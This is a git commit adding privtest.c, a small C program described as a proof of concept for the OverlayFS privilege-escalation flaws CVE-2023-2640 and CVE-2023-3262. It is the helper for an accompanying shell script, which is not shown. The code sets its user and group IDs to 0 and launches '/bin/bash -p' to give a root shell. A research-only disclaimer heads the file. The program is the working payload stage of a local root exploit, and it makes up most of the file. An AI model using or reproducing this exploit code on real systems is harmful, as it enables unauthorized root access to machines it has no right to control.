0c7e4fa8de9fbcb4790d17362a4ee4aedd8b57fb
m0rphisto <m0rphisto.net@gmail.com>
2024-02-03 08:04:25 +0100

    PoC CVE-2023-2640 CVE-2023-3262

---
+++ zsh/privilege-escalation/overlayfs/privtest.c
@@ -0,0 +1,51 @@
+/**
+ * ---------------------------------------------------------------------
+ * Id: privtest.c v0.2 2024-02-02 23:29:40 +0100 .m0rph $
+ * ---------------------------------------------------------------------
+ *
+ * Description:
+ *  Little tool, utilized by the shell script privtest.
+ *
+ * Privilege escalation via overlayfs...
+ *
+ * Credits:
+ *    Found on https://gist.github.com/win3zz
+ *
+ * ---------------------------------------------------------------------
+ * Disclaimer:
+ *  This Proof of Concept (PoC) is intended for research and educational purposes
+ *  only. Any actions taken based on the information provided in this gist are
+ *  solely at the user's own risk. The vulnerabilities described in this report
+ *  should not be exploited in any unauthorized or malicious manner. The authors
+ *  and contributors are not responsible for any misuse or damage that may
+ *  result from the use of this information.
+ *
+ *  Please keep in mind that using malicious software and causing damage at
+ *  foreign systems without being ordered or charged is ILLEGAL and will
+ *  result in law enforcement!
+ *
+ *  The worst case is: YOU WILL END UP IN PRISON!
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int main()
+{
+   if(setuid(0) != 0 || setgid(0) != 0)
+   {
+      // First test, if we can set privileges.
+      fprintf(stderr, "\x1b[1;31mFailed to set UID/GID 0\x1b[0m\n");
+      return 1;
+   } 
+
+   printf("Entering \x1b[1;31mprivileged\x1b[0m shell ...\n");
+   if(system("/bin/bash -p") == -1)
+   {
+      fprintf(stderr, "\x1b[1;31mFailed to execute /bin/bash -p\x1b[0m\n");
+      return 1;
+   }
+
+   return 0;
+}
